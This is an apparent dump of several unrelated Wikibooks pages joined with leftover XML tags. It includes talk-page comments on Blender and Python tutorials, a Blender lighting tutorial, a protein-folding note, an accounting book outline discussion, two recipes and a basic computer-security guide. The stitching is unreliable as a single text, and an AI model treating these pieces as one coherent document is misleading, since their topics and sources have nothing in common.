''(''Huh? I needed Edit Mode for this'' - You must not have selected it at first, you really do need object mode.) ('''They both work'''...ObjectMode for the object...EditMode for various parts, including All...'''''Ver. 2.42a'''''. And BTW the version reference should, IMHO, be at the top of '''ALL''' tutorials, at the top of each Section, and referenced by responders to avoid miss communicatin(s)...)''

I think they belong here. [[User:Sevcsik|Sevcsik]] 17:31, 20 March 2007 (UTC)

== Adding or Deleting Objects ==

* In light of the discussion around the 3D Cursor Tutorial, perhaps this section can be moved just above that tutorial, and expanded a little to include a discussion about AKEY to deselect all / select all.
* In this section it tells the reader to &quot;make sure the 3D cursor is inside the cube&quot; before pressing Del. Why is this? Should this be explained? I tried without the 3D cursor inside the cube and it still deleted just fine.
* Also, it appears that this is the first time the contextual SPACE menu is mentioned, rather cavalierly. Shall we make it simpler by just having the user choose from the Add menu for now? And introduce the SPACE menu and the gestural interface a little later on? [[User:Garmon Sutrix|Garmon Sutrix]] 15:40, 15 May 2007 (UTC)

== Placing the 3D cursor section could use more snapshots ==

Just finished this chapter and even though this is a great book so far I'd recommend having a few more photos in this section to give an example of what the user is supposed to do. [[User:71.228.155.181|71.228.155.181]] 23:33, 20 October 2007 (UTC)

== Reformated the page ==
I've edited this page and restructured some content. This should allow for a better adhesion to the 80/20 rule. Please redirect the following protip elsewhere:
&lt;nowiki&gt;
==Pro Tip==
* If you can, find a mouse with side buttons. Anything like Microsoft's Intellimouse, or Logitech's Mediaplay, that have back/forth buttons, will do. Map those buttons to the MMB. This makes camera control feel a LOT more intuitive (plus it frees up a finger).
&lt;/nowiki&gt;
[[User:EvanCarroll|EvanCarroll]] 01:21, 28 October 2007 (UTC)

All ''[NOTE: ... ]'' need to be worked into prose, or removed. Or, made into '''Footnotes''' They are an eyesore and prevent fast-scanning of the material. I would take a gander this material could be presented in a fashion which would cut learning time down by 70% by reworking the assumed policies of this book. [[User:EvanCarroll|EvanCarroll]] 01:36, 28 October 2007 (UTC)

== Object vs. Edit View ==
One of the hints that was provided is that the status bar in the top right corner has text that says Ob:... or Ed:... depending on the mode. While this is correct, it may be worth pointing out that Ed stands for Edges, not edit.
[[Special:Contributions/124.171.128.48|124.171.128.48]] ([[User talk:124.171.128.48|talk]]) 10:18, 9 January 2008 (UTC)

&quot;A status bar at the top-right of the user preferences window will indicate the current mode by displaying 'Ob' or 'Ed' depending on the currently toggled mode.&quot; 
This should rather be mentioned as an optional way of checking it - the Object Mode/Edit Mode can be plainly read from the 3d window border, which is now given as a &quot;secondary&quot; way of checking your mode. It took me several minutes to just find the Ob/Ed in the top right corner status bar (Yes, the STATUS BAR is in the top-right corner, no, Ob/Ed-text is not.)

== Object Orientation ==

''Why not add a monkey? Choose Add &gt; Mesh &gt; Monkey. [If you prefer the monkey to be facing frontwards, make sure to be in FRONT view (NUM1) before adding the mesh - note: in Blender 2.48a, it's complicated. If Blender is in Object Mode, the monkey is always facing up. If it's in edit mode then the direction the monkey faces depends on the view (top, side or front)]''

I don't know if it's appropriate to mention changing preferences this early in the book (I doubt it)... but you can change that behaviour in 2.48a with Preferences / Edit Methods / Aligned to View. [[Special:Contributions/210.56.81.102|210.56.81.102]] ([[User talk:210.56.81.102|talk]]) 13:31, 24 May 2009 (UTC)

== Uncertainty about state of the &quot;3D Transform Manipulator&quot; ==

Thanks very much for this documentation!  The line &quot;2. Disable the &quot;Use 3D transform manipulator&quot; option by using the icon located on the 3D viewport's window header (shaped like a pointing hand). Or, hit CTRL+SPACE to toggle.&quot; doesn't help me understand which state is enabled or disabled.  In both states, the mouseover text for the hand is the same: &quot;Use 3d transform manipulator (Ctrl Space)&quot;.  I guess the enabled mode is when the red triangle, green circle and blue square appears.  Newbies have never heard of this thang, so it might be helpful to tell them how to tell whether it is enabled or not.  Robin Whittle

I think it's pretty obvious when the manipulator is on. It's kinda hard to miss large, colored arrows. --[[User:JamesNZ|JamesNZ]] ([[User talk:JamesNZ|discuss]] • [[Special:Contributions/JamesNZ|contribs]]) 05:55, 27 July 2011 (UTC)

== laptop function (virtual) numpad ==

As I read in the tutorial that the viewport movement would only be done through numpad (numeric pad), I started to shop for a wireless numpad for my laptop but I found out that there was already a virtual one on it and it works in blender where it says only a numpad would do : using the function key, there a slanted rectangles of the keyboard starting on the number row on its right-side, all the numbers are placed the same (slanted) so it's pretty intuitive.

I'm thinking of getting something that could make a border on those keys that's not distractive when I'm typing text and is temporary, perhaps vinyl ...

== Minor point about creating new objects ==

I'm a Noob ... and am wondering if I'm missing something.  I'm using Blender 2.49b and when I create a new object the display remains in Object Mode.  The tutorial (and another book I'm reading) say &quot;A new object will be added, and you will be in what's known as Edit Mode&quot;.  Has there been a change in this version?  Also my book says there should be a &quot;Pose Mode&quot; available but I only see &quot;Sculpt Mode&quot;.  Was there a change in this description?  Great Tutorial by the way!
== Information overload ==

Despite this section being basics, the exact use of it is questionable. Since the user (most likely newb/noob) hasn't done any actual editing of objects (that's what it seems like this guide assumes.), they won't know the real use for the hotkeys, perspectives etc. Its pretty hard to memorize everything here. Doing actual modeling like in 'quickie model' makes remembering this stuff wayyyyyy easier. It might be worth moving this section so it's after the quickie model.

The stuff here are basics, I think it'd be best to keep it here. --[[User:JamesNZ|JamesNZ]] ([[User talk:JamesNZ|discuss]] • [[Special:Contributions/JamesNZ|contribs]]) 05:55, 27 July 2011 (UTC)

== Orthographic vs. Perspective ==

This section claims that Blender gives an orthographic view by default, but my 3D View window (like the images in this book) is in perspective view by default.  Am I crazy here, or is this text a relic from an earlier version of Blender?  - Asterai

== Rotation hotkeys ==

My factory-settings Blender uses Num1, Num7 and Num9 (NOT Num3) for perfect views.  Update page?  - Asterai
Never mind.  I was wrong about how my pseudo-numpad was set up.  *Facepalm* - Asterai

== Modes Deprecated? ==

My recently downloaded  version of blender only has 2 modes available, Object mode and Edit mode...the other modes do not show up in the mode menu.</text>

      <text xml:space="preserve">Protein structure can be viewed at four levels:
I) Primary Structure: The amino acid sequence of a protein. 
II) Secondary Structure: Motifs which sections of a sequence organize themselves into. These are mainly alpha helices and beta sheets.
III) Tertiary Structure: The overall structure of a single polypeptide.
IV) Quaternary Structure: The way that two or more polypeptides join to form a single unit. (Not all proteins have a quaternary structure since many polypeptides function solo.)

The main question posed by the protein folding problem is &quot;Can the final folded structure of a protein be predicted from its amino acid sequence?&quot; In other words, given the primary structure, can the higher order structures be predicted. So, far there has been limited success with predicting portions of the secondary structure based on amino acid sequence. For instance, certain amino acid sequences are recognized as likely to fold into various motifs. 
Success in predicting tertiary structure has been even more limited. Further complicating this problem is that many proteins require the help of other proteins (molecular chaperones) to fold into their proper conformation. 

Certain amino acids form attachments to other amino acids. Certain amino acids repel certain other amino acids. How do the right amino acids wind up attached to their corresponding amino acids? If the wrong amino acids wind up attached to other attractive, but inappropriate amino acids a nonfunctional conformation will be achieved. For a protein to function properly it must attain its proper conformation, otherwise it is just a tangled, useless mess!

{{B3D:N2P/ForVersion|2.49}}

You can quickly add several different types of lights to your blender scene

{{B3D:N2P/Do|SHIFT|AKEY}} → Lamp → Spot

A light will appear in the location of the 3D cursor. You can move a light just like any other object. 

If you want to quickly light a scene just for illumination, not for a specific look, add four lamps around your subject.  If you are interested in experimenting with a lighting arrangement, a nice quick way to experiment is to create a Monkey in the scene to test with. 

{{B3D:N2P/Do|SHIFT|AKEY}} → Mesh → Monkey  

The monkey is just as good of a test subject as a human face, so give it a try.  You can throw various materials on the monkey and try different textures too. Don't bad mouth the monkey, she is really useful. 

== Explaining the Different Lamps ==
*'''Point''': Single point light source. Provides very localized light. The shadows can be sharp, or you can set its size to something nonzero to make the shadows fuzzy. Useful for representing light sources within the scene; e.g. if there is a lightbulb or candle or something in the scene, position one of these within it to give the impression of light coming from that object.
*'''Sun''': A light with parallel rays that will illuminate the scene with a bright even light. Because the sun is (effectively) infinitely far away, the position of this lamp does not matter, only its direction. Good to use in brightly-lit outdoor scenes (i.e. a sunny day).
*'''Spot''': Spot lights produce light in a cone shape, and have some special features. They are the only light source that can be made visible with the 'halo' option, to simulate light in a fog. They are also the only light source that can cast buffer shadows (see below).
*'''Hemi''': 180°-wide uniform, shadowless light source. Great for use as a fill light, or as a back light. Similar to Sun, its position does not matter, only its direction.
*'''Area''': These are similar to point lamps, except that they are rectangular. As a result they can cast accurate raytraced soft shadows. These are my lamp of choice for still shots, but they take a lot of time to render.

You might want to see the [http://www.mediafire.com/file/mfk4k39w6fu38j5/light-test.blend adjusted scene] and play around with it for awhile.

=== Shadow Types ===

There are two different kinds of shadows that lights may cast: ''buffered'' and ''ray-traced''. The main difference is that buffered shadows are much quicker to calculate, but take more memory, and can be of lower quality without some fiddling. Also strand-rendered materials (as can be used for hair or fur) cannot cast ray shadows with the Blender Internal renderer, so you have to use buffer shadows for them so their shadows look realistic.

Only spot lamps can cast buffered shadows. Hemi lamps cannot cast shadows at all.

== Creating a basic scene with basic lighting ==
*This addition is simply a way to apply what you know about lights and to discover a few settings like colors or creating simple shadows. The purpose here is to create a basic scene with a sphere over a plane, nicely lighted. You should already know the basics of Blender (creating a mesh, moving and rotating it, rendering).
=== Creating the scene ===
*Okay, let's start! Open a new file. Add a '''UVsphere''' of 32 rings and 32 segments. Leave it in the center of the scene.

[[File:Blender263ShadingButtons.png|right|Smooth button]]
Click the '''Smooth''' button in the Tool Shelf on the left of the 3D view ({{B3D:N2P/Do|TKEY}} to make it visible if it’s not) so the sphere will render as a nicely smoothed sphere.

*Add a '''Plane''', and move it just under the sphere to be the floor. Scale it so it is very big. The ideal would that we can't see borders with the camera.
[[File:TopPlane.png|Top view of our REALLY BIG plane]]

*Then we will move the '''Camera'''. Grab it and rotate it so it looks at the sphere from top and a bit from the right. You can have an idea of what it sees pressing {{B3D:N2P/Do|NUM0}} to have a '''CameraView'''.
[[File:CameraView.png|What the camera should be looking at]] 

'''Trick : '''First {{B3D:N2P/Do|RMB}} on the Camera, then {{B3D:N2P/Do|SHIFT|RMB}} on the Sphere (the order is very important). Do a {{B3D:N2P/Do|CTRL|TKEY}} and select '''TrackTo Constraint'''.
[[File:MakeTrack.png|Select TrackTo Constraint]]

The camera will be looking at the center of the sphere... You can then move either the camera or the sphere and the camera will still point at the sphere.
[[File:CamTracked.png|The Camera is looking at the Sphere]]

=== Adding the lights ===
*Okay, what we have is a pretty beautiful scene, isn't it?... Well, it isn't! But it is enough to add some lights... Here I will describe a basic lighting scene I use as a default for fast renderings. I picked it out from another tutorial, you can find the link at the end of this page.
[[File:Blender267LampContextSpot.png|right]]
*Now we will add our so-awaited lights. '''{{B3D:N2P/Do|SHIFT|AKEY}}→Lamp→Spot'''. Yes, we will first use the Spot light. We can see it as a projector. This is the only light casting shadows. Place it so it is upper and on the left of the sphere. Rotate it so it looks at the Sphere (you can use a '''Trick''' I gave you before to have the light looking at the sphere).
*Okay, let's see what we can tune with the spot light. Having the lamp selected, go in the '''Lamp''' settings: [[File:Blender267LampDataContextButton.png]]

You will see these buttons (right):

*Yeah, really lots of options. Don't worry, I'll explain the basic ones.
**'''Distance''' : Sets the maximum distance the light can reach. Increase it so the lighting cone really goes behind the sphere. I set it to '''Distance:40'''.
**'''Energy''' : This is the force of the light. You can leave it at '''Energy:1'''.
**'''RGB''' : You can change the colour of the light. Click on the colour and a little window will appear to select the colour you want. Leave it '''white'''.
[[File:Blender267ColourPickerRGB.png]]
**'''Buffer Shadow''' : Enables the light to cast shadows, leave it '''pushed'''. [[File:BufShad.png|Here you will create the dark side]]
**'''Only Shadow''' : This light only creates shadows, without casting light ( yeah quite unrealistic, but it can be useful ). Leave it '''unpushed'''. [[File:OnlyShad.png|Adding a shadow without changing current lighting]]
**'''Spot Shape Size''' : This is the angle of your cone, in degrees. Leave to '''Size:45'''.
**'''Spot Shape Blend''' : This smoothes the circle cast by the light. We will smooth it so that it looks better. Set it to '''Blend:0.4'''.
**'''Clip Start''' and '''Clip End''' : This is the distance from the light between which shadows will be cast. You can see the &quot;line of effects&quot; in the 3D windows when you change these. Set them so the line starts before the sphere and ends far ( well, a bit ! ) behind the plane. You should obtain something like this. (this is very important... If you do this badly, it can result in completely dark scene!)

{{Clear}}
*Now, we have set our Spot light. This light will be our side light and shadowing light. You can make a fast preview pressing {{B3D:N2P/Do|F12}}. You can see your so nice shadow. But there isn't enough light... Let's add some more!
[[File:Blender Render1.png|So dark! Let this tutorial bring light to your scene]]

*Time to add a second light! '''{{B3D:N2P/Do|SHIFT|AKEY}}→Lamp→Point'''. This time, we will create a point lamp. This is like a point which emits light in every direction from that point. You should place it at the opposite of the camera, quite at the same height. This light will be used to better see the form of the sphere and to add a sort of general lighting of the scene.

*Go in the Lamp buttons, and set it to a higher energy like '''Energy:1.25'''. You can make a quick render to see how much this light is important to a scene.
[[File:Render2.png|Yo, much better !]]

*Now, we will add a second basic lamp. '''{{B3D:N2P/Do|SHIFT|AKEY}}→Lamp→Point''' and we will place it just behind the camera point of view, a bit moved at the opposite of the Spot light. This third light will slightly light the dark parts of the sphere.

*Decrease the energy of this light, as it is only supposed to fake the reflections of the environment. I set it to '''Energy:0.8'''. Another little trick, as this is not supposed to be a direct light, there shouldn't be a little white glow called '''Specular''' on the sphere coming from this light. Uncheck '''specular''' checkbox. 

*Okay, it's time for the final rendering. Of course, this is a really basic lighting set you can use for rendering a simple mesh; but for more complicated scenes, lights can come from other places, with other colors, etc... Thus we didn't use the '''Sun''', '''Hemi''' and '''Area''' lights, which are a bit more complicated.
[[File:Render3.png|All this, only to light a sphere ...]]

For a more in-depth tutorial, here is [http://download.blender.org/documentation/html/x4029.html a tutorial from the Blender Documentation], which has been a great source of help for me.&lt;br /&gt;
'''User note:''' you might want to check this tutorial on lighting:  http://www.youtube.com/watch?gl=US&amp;v=YJiR2Q7uvbQ

=== Outdoor lighting ===
*Here you will use a '''Sun''' in conjunction with a '''Spot''' light and some little '''Lamp'''s.

=== Lighting Without Lamps ===
It is possible to light a scene without lamps, or with fewer lamps. In the World Context [[File:Blender255WorldContextButton.png]] of the Properties Window, there are three options, for “Environment Lighting”, “Ambient Occlusion” and “Indirect Lighting”.

Environment Lighting adds a shadowless light that seems to come from all directions and fill all parts of the scene.

Ambient Occlusion (“AO” for short) is supposed to mimic the effect of shadows darkening corners and crevices of real-world objects (in theory this should naturally fall out of accurate lighting calculations, but it is easier to compute it separately); Blender also allows you to use AO to ''brighten'' parts of the scene outside those corners and crevices.

Indirect Lighting tries to mimic light bouncing off diffuse surfaces and illuminating other diffuse surfaces. It only works when the “Gather” option (next panel down) is set to “Approximate”.

* Ambient Occlusion Video Tutorial:  http://www.youtube.com/watch?v=rKUAemD7oo4
* In older (pre-2.5) versions of Blender, there was an option called “Radiosity” ([http://www.youtube.com/watch?v=_M4ffj2w_WY Video Tutorial]), which is no longer supported.

      <text xml:space="preserve">I see there are two versions of this tutorial on Wikibooks: this one and another user's reworking of it which is linked to from the wiki's Programming Language Survey page (http://en.wikibooks.org/wiki/Computer_programming).

I prefer this version as it is written in a direct, plain language suitable for teaching new users, especially if they are also non-native English speakers.  In fact, this tutorial is the only Python intro I've seen that maintains this standard of accessibility. I don't think the second author is justified in presenting his/her version as an improvement over this one.

== The other Python Language ==

The other python language is a bit more advanced, and harder to learn [no tutorials to date] but we've managed to find an excerpt of a conversation in motion.

:Sadly this was removed as nonsense.  I left it in because I thought it was funny, but I am not going to re-add it to the article. [[User:Jrincayc|Jrincayc]] 02:39, 26 June 2007 (UTC)

I am reading this tutorial on July 1, 2009, and find that the links to the Tutorial for Programmers by Guido van Rossum are not working. Does anyone know where this publication can be found on the Internet?

Thanks

:I fixed the link.  Thanks for pointing that out. [[User:Jrincayc|Jrincayc]] ([[User talk:Jrincayc|talk]]) 16:04, 3 July 2009 (UTC)</text>

      <text xml:space="preserve">I'm an accountant, with years of managerial, public, and governmental accounting experience. I am also an adjunct instructor in accounting.  The field of accounting is HUGE, and may be of interest only to a few. I just updated the question about accounting standards on the previous page. If you have any questions that you feel should be answered, please ask. Otherwise, I'll just post things I find interesting and may very well leave out fundamental aspects of accounting.

== Expanding into a full book ==

(Previous content removed; issues have mostly been addressed.)

*I think the module with the title Accounting should be a comprehensive text, while smaller topics (such as a [[Accounting/Quick Reference|Quick Reference]]) should have their own 'books'. 
*Outline: Following is a tentative outline of the chapters to be included. Most of what is currently in the article should probably be rolled off into Chapters 2-4.
1 - [[Accounting/History and Overview|History and Overview]] - A brief history of accounting, as well as introduction and explanation of some of the fundamental principles. Also covers forms of business ownership (Proprietorship, Partnership, Corporation, and variants thereof) and how they affect accounting.

:What is the purpose of this text?  You can't make a text that covers an entire undergraduate and graduate accounting curriculum; it would be huge.  So you need to focus on a need.  I'm assuming that this is meant primarily as an introductory (first course) course in accounting.  If so, then I'd drop the history.  While I'd personally love to see a good history of accounting text book, I've already got my B.B.A and M.Acc.[[User:Fcoulter|fcoulter]] ([[User talk:Fcoulter|talk]]) 20:10, 2 August 2009 (UTC)

2 - [[Accounting/Accounts|Accounts]] - Explanation of types of accounts, and an introduction to Journalizing.

:I'd break this into two sections.  First, an explanation of the types of accounts and the accounting equation.  Then, I'd put journalizing after the next chapter on Transactions.[[User:Fcoulter|fcoulter]] ([[User talk:Fcoulter|talk]]) 20:12, 2 August 2009 (UTC)

3 - [[Accounting/Transactions|Transactions]] - In-depth recording of transactions from the original document through the journals to the ledger. Chapters 2 and 3 are likely to be '''very''' long and perhaps should be divided further.

:I agree with the thought that this should be broken into two chapters.  First, using the accounting equation I suggested you introduce above, have a chapter discussion transactions.  Then, the next chapter talks about the mechanics of journalizing transactions.  Heck, you could even add one more chapter on moving from the General Journal to the General Ledger.  (I know that computers hide this from most people, but you need to understand what's happening if you want to call yourself an accountant.)[[User:Fcoulter|fcoulter]] ([[User talk:Fcoulter|talk]]) 20:15, 2 August 2009 (UTC)

4 - [[Accounting/Financial Statements|Financial Statements]] - This is in preparation of the next chapter. (Trial Balances would have been introduced in an earlier chapter, however, to show the balance of the accounting equation, most likely in Chapters 1 and/or 2.)

:Which statements are you planning on doing here?  I'd skip Cash Flow for quite a while.  And if you're not closing the books, do you really want to create a Balance Sheet?  I would either move closing entries up before this chapter, or only deal with the Income Statement.[[User:Fcoulter|fcoulter]] ([[User talk:Fcoulter|talk]]) 20:19, 2 August 2009 (UTC)

5 - [[Accounting/The Accounting Cycle|The Accounting Cycle]] - Adjustments and Closing entries, and a comprehensive review up to this point.

:As I said above, I would discuss closing entries and the Accounting Cycle before Financial Statements.  A review chapter at this point would also be an interesting idea.[[User:Fcoulter|fcoulter]] ([[User talk:Fcoulter|talk]]) 20:23, 2 August 2009 (UTC)

6 - [[Accounting/Partnerships and Corporations|Partnerships and Corporations]] - In-depth coverage of how equity transactions differ between forms of business. Up until now all examples would've been for a Proprietorship; following this, all examples should be of mixed business types.

:It looks like you're going back over the balance sheet / income statement accounts in more detail.  But I wouldn't do it in this order.  The equity section is the most confusing for my students.  I would hold off on this until after making another sweep through the balance sheet (and maybe even revenues and expenses).[[User:Fcoulter|fcoulter]] ([[User talk:Fcoulter|talk]]) 20:28, 2 August 2009 (UTC)

7 - [[Accounting/Credit Transactions|Credit Transactions]] - Reviews recievables/payables, introduces credit terms(in preparation for the next chapter - just an overview), and subsidiary ledgers.

:I would discuss assets in one chapter, liabilities in the next, then the equity chapter you listed above.  Cash, receivables, and inventory are far easier to understand than prepaid expenses.[[User:Fcoulter|fcoulter]] ([[User talk:Fcoulter|talk]]) 20:28, 2 August 2009 (UTC)

8 - [[Accounting/Merchandising Activities|Merchandising Activities]] - Sales/COGS transactions, Merchandise valuation methods (FIFO, LIFO, etc.), and special journals.

:Using Sales, you could go into both CoGS as well as special journals and subsiary ledgers.  I'm not sure how far you should go in merchandise valuation in an intro book.  (I find it really difficult to go into any detail about inventory valuation before the student has taken a decent cost accounting course (or at least the second semester managerial accounting course). Then another chapter on other special journals and other subsidiary ledgers would be good.

:Basically, I'm a little concerned that your outline will result in either (a) very long and hard to digest chapters, or (2) an outline of an introductory accounting text book.  By breaking it down further (and possibly reordering some items), I think you can avoid these potential pitfalls.[[User:Fcoulter|fcoulter]] ([[User talk:Fcoulter|talk]]) 20:36, 2 August 2009 (UTC)

I think this point would be good to break for an introductory Accounting book; it is equivalant to what is covered in a 101-level college course or an introductory high school-level course. A next-level book would probably work better as a seperate project, but until such a project begins, this one should probably stay here at [[Accounting]], and if/when it does begin, this should probably be moved to Fundamentals of Accounting or Principals of Accounting or something similar, but seeing as how there currently isn't much other material, I don't see a need to move it now.

:The reason for moving it now would be that once it's complete, you may wish to publisize it.  If you move it, then all the links will be broken.  Why would you want to go to the trouble of writing a text book and only use it for your classes. rather than sharing it with the world.

:Of course, that goes directly to the question of why you're writing this book.  There are lots of Introductory Accounting text books out there.  There are even some good free ones.  (I like [http://www.principlesofaccounting.com/ Principles of Accounting].  Writing a text book is hard work.  What will be different (better?) about your book that justifies all the time you're putting into it?

:Yes, I too am in the very early stages of writing an accounting text book.  But my first step is to see if what I want is commercially (or freely) available.  I don't think so, but I've contacted a couple of the professional organizations to double check.  If it's available for free, and it's well done, I'm not going to duplicate it.  If it's available commercially at an inexpensive price, it'll be very difficult to justify writing one.  However, I think that it's not available elsewhere, and that the potential market is not large enough to justify attempting to get a text book publisher to pick it up.  And so, I'm investigating the possibilities.[[User:Fcoulter|fcoulter]] ([[User talk:Fcoulter|talk]]) 20:44, 2 August 2009 (UTC)

*Chapter Format: Each chapter should follow a certain format, something like(but not limited to) the following:
#Chapter Overview - Brief summary paragraph (less than 10 lines or so) introducing the material of the chapter.
#Terms - List of new terms with links to glossary page(see below).
#Chapter Body - This may end up being split into multiple subpages due to length, since multiple related topics are covered in each chapter. A short review problem or a few short questions should be at the end of each section, with the answers on the chapter's Answer Page(once again, see below).
#Chapter Summary - Review of the chapter.
#Exercises - Several large problems and some smaller problems covering different aspects of the chapter.
#Summary Problems - A few (no more than three?) comprehensive problems that encompass the entire chapter as well as reinforce concepts from earlier chapters.
One convention I've found to be effective in Accounting textbooks is the use of fictional businesses throughout the chapters as examples to the concepts presented.
*The glossary and answer pages were mentioned above. The glossary page is just that - an alphabetical glossary, cross-referenced back to the original appearance of the term. Terms should be linked to the glossary in the Terms section of the chapter, the first appearance of the term in the Chapter Body, and in the Chapter Summary.
*The answer pages are answers to the problems given in the body text and end section of the chapter. In addition to giving the actual answers, it should be explained ''why'' the answers are what they are.
*If someone could help me with some templates I would be very grateful. I've been through the meta page on it a few times and still don't understand it. The use of templates for showing Journal and Ledger entries would save a '''lot''' of time in preparing examples. Here's a tentative list of what templates could be put to use:
**Journals:
***(see the Journals templates section below)
**Ledgers:
***Ledger Header - Account Name &amp; Number and column headings
***Ledger Entry - Date, Comment, PR, Debit amount, Credit amount, balance. Fields included as applicable.
That's probably all that would be needed to start with. Special journals and subsidiary ledgers only appear briefly so having their own template would be a waste and it would probably just be easier to Table those. But general journals and ledgers are going to appear throughout the text and this would expedite the process quite a bit - the contributors could concentrate on text and examples, and not markup.

I guess that's about all I wanted to say, so now it's time to get down to writing. As content is completed, it should be moved to the chapter pages and replaced with a link to those pages; once chapters 1-4 are mostly complete the main page should take over the role of a chapter index. [[User:Xerol|Xerol]] 04:42, 6 October 2005 (UTC)

:I am a bit concerned about the date of this entry.  It's been almost four years.  Have you dropped the idea?  If so, I wonder if anyone else wants to pick it up.[[User:Fcoulter|fcoulter]] ([[User talk:Fcoulter|talk]]) 20:44, 2 August 2009 (UTC)

I added [[Accounting/Quick_Reference]] and [[Accounting/Templates]] here, instead of on the bookshelf page- please revert this if they don't belong to this book. [[User:Paul Lynch|DettoAltrimenti]] 00:51, 28 May 2006 (UTC)


''Why is this section called &quot;Accountancy&quot; rather than &quot;Accounting&quot;?  I'm a CPA, CISA, and MA and in all my years of study, practice (public and private) and in adjunct teaching, have only heard the term &quot;Accountancy&quot; used by the upper levels of academia administration. The rest of the civilized (English speaking) world refers to the study of this profession “Accounting”.  In order to make this WikiBook a useful one, I would strongly suggest that the conventions of the real-world be used in this case. The purpose of Wikiversity in general, and this Wikibook in specific, is not to promote the speech used in the upper levels of academia, rather to educate those who are new to the field of Accounting. (For case in point, in every job posting in this field, within the US, the posting is for “Accounting,” not “Accountancy.”)''

::Exactly. What you do for a living is &quot;Accounting&quot;. However this book is not about what you do for a living. This is a book about the fundamental concepts behind it that you need to know before once can practice &quot;Accounting&quot;. Accountancy is the study of Accounting. Thus Accountancy is far more appropriate for an explanitory text.  But please, rather than fight over nunance, with your credentials, please contribute content. Be Bold! --[[User:Mig77|Mig77]] 15:11, 22 August 2006 (UTC)

::In general though, many people haven't heard of the term Accountancy, and might be confused or turned off by the title of the book. Accountancy might be the study of Accounting, but aren't most people who read this book going to be Accounting students, studying the practices and formalities of accounting, as opposed to the theory behind it all? I've only ever heard that term a few times and if an accountant has never heard of it, maybe we should call the book Accounting so that it's more clear. Most Accounting textbooks that I've ever encountered don't use the term Accounting and the wikipedia article gives different definitions than yours. [[User:Sean Antrim|senanatrim]] 06:28, 21 November 2007 (UTC)

:::My Masters degree says Accountancy.  My spell checker thinks my resume is misspelled.  Take that however you like.[[User:Fcoulter|fcoulter]] ([[User talk:Fcoulter|talk]]) 19:57, 2 August 2009 (UTC)

== Thanks ==

I'd like to thank Wikibooks for this wikibook.
I couldn't find any accountancy books in my school library (lol)

'''Bubble Tea''' is a tea beverage with tapioca pearls (black balls) mixed in.

==Ingredients==
*½ [[Cookbook:Cup|cup]] (125 mL) cooked bubble tea ([[Cookbook:Tapioca Pearls|tapioca]]) pearls: cook pearls according to the instruction on the package
*1 cup (250 mL) crushed ice
*1 cup (250 mL) very strong chilled black [[Cookbook:Tea|tea]]
*1 cup (250 mL) homogenized [[Cookbook:Milk|milk]], or to taste
*[[Cookbook:Honey|honey]] or [[Cookbook:Granulated_Sugar|granulated sugar]], to taste

==Procedure==
#Place pearls in a large parfait glass,
#Combine all remaining ingredients in a cocktail shaker,
#Shake vigorously until mixture is frothy
#Pour into glass and serve with large-diameter straws. 

The ingredients are combined together without shaking it vigorously if it is not desired to be frothy or bubbly.

==Servings==

Approximately 2 servings.

This makes a 16 [[Cookbook:Fluid Ounce|ounce]] (473 [[Cookbook:mL|mL]]) drink using a US cup size of 237ml, or 473.5ml drink using the metric units. Note however, that the ingredients total up to at least 28 ounces (828 mL) or 875ml using the metric units, so it serves a little less than 2 servings.

'''Chicken Parmesan''' is a classic Italian dish, which is wonderful served over [[cookbook:pasta|pasta]] or on a [[Cookbook:Sandwiches|sandwich]]. This is a fairly simple recipe made mostly with ingredients already on hand.

Serves 4.

==Ingredients==

* 6 [[Cookbook:Chicken|chicken breast halves]] flattened to ½&quot; thickness
* ½ cup [[Cookbook:Flour|all purpose flour]]
* 2 [[Cookbook:Egg|eggs]]
* 1½ cups Italian seasoned [[Cookbook:Bread Crumb|bread crumbs]]
* ½ cup grated [[cookbook:Parmesan Cheese|Parmesan cheese]], divided
* ½ tsp [[Cookbook:Salt|salt]]
* ½ tsp [[Cookbook:Pepper|black pepper]], fresh ground if possible
* [[Cookbook:Olive Oil|olive oil]]
* 1 16 oz jar [[Cookbook:Spaghetti Sauce|spaghetti sauce]] (or make it fresh)
* 1 package sliced [[cookbook:Mozzarella Cheese|mozzarella cheese]]

==Procedure==
# Preheat the oven to 350°F (175°C).
# Mix the breadcrumbs, salt, black pepper, and half the Parmesan cheese in a [[Cookbook:Mixing Bowl|mixing bowl]].
# [[cookbook:Beat|Beat]] the eggs in a small bowl.
# On the stove, heat olive oil in a large [[Cookbook:Frying Pan|frying pan]] over medium-high heat
# Take each chicken breast and dip it into the flour, then into the eggs, then into the breadcrumb mixture.  Make sure to coat it thoroughly.
# [[cookbook:Pan fry|Pan fry]] the chicken breasts lightly in the olive oil until brown on both sides. You do not need to cook them through, just [[cookbook:brown|brown]] them. Once brown, the breadcrumbs should stick to the outside.
# Pour half a jar of pasta sauce into a shallow baking dish, then lay the chicken out in the pan. Pour the rest of the sauce on top.
# Dust the remaining grated Parmesan cheese over the chicken.
# Place the dish in the oven and cook for 30 minutes at 350°F (175°C).
# Remove and add a slice of mozzarella cheese to each chicken breast.
# Return to the oven for 10 more minutes to melt the mozzarella.
# Serve with [[cookbook:pasta|pasta]].

      <format>text/x-wiki</format>
      <text xml:space="preserve">=Why Security Matters=
Why should you spend effort to keep your computer secure? There are many reasons why someone would want to do so.
===Protect Others on the Internet===
Failure to properly secure your computer could mean that your computer will be used by criminals to send spam messages or be part of an attack against web sites or it may harm your computer hardware and crash your computer.

===Malware can cause trouble with your computer===
Malware, viruses, worms and Trojan horses all can affect your computer and attempt to steal personal information from you or make your computer unresponsive, necessitating you to reinstall Windows
===Protect Your Privacy===
Many spyware apps may collect information on stuff like your web browsing habits and sell them so ads will be targeted to your tastes.
===Criminal Intentions of Crackers===
Many crackers intend to hack to get a hold of credit card numbers, passwords, and other items that they can use for making a profit.

=Updating=
Updating is the process of updating certain elements of a program to close vulnerabilities in a certain scenario. This will mean that your computer will be protected against future threats from a certain scenario. In Windows, updates are regularly done around once a month on Tuesdays.

=User Privileges=
The administrator account should not be used for anything but administration purposes, or for programs that require administrative privileges. This is because it is too easy for your computer to become victim of malware, Trojan horses and viruses while logged onto an administrators account. This is especially important when performing your normal tasks like browsing the web, checking your e-mail, or word processing. This is because many of the programs that hackers use in an attempt to infect your computer require that you be an administrator to execute. They require writing files to certain directories, and registry keys, that &quot;normal&quot; user do not have access too. These programs are often hidden within webpages, IM chat windows, word processing documents, and e-mails. It is a very good idea to create a new user without administrative privileges to use on a normal basis.

